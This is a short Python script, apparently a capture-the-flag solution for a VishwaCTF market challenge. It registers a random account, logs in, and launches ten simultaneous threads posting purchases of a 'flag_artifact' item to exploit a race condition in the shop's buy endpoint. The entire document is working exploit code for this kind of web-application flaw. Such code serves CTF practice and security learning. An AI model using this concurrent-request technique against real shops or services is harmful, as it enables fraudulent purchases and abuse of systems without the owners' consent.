import requests
import random
import string

url = "https://market.vishwactf.com/"
s = requests.Session()

creds = {
    'username': ''.join(random.sample(string.ascii_lowercase, 10)),
    'password': 'a'
}

# login
res = s.post(f'{url}/api/signup', json=creds)
res = s.post(f'{url}/api/login', json=creds)

if 'username' in res.json():
    print("> Logged in")

import threading

# race condition
def buy():
    res = s.post(f"{url}/api/buy", json={"itemId":"flag_artifact"})

    print(res.json())

threads = []

for _ in range(10):
    t = threading.Thread(target=buy)
    t.start()
    threads.append(t)

for t in threads:
    t.join()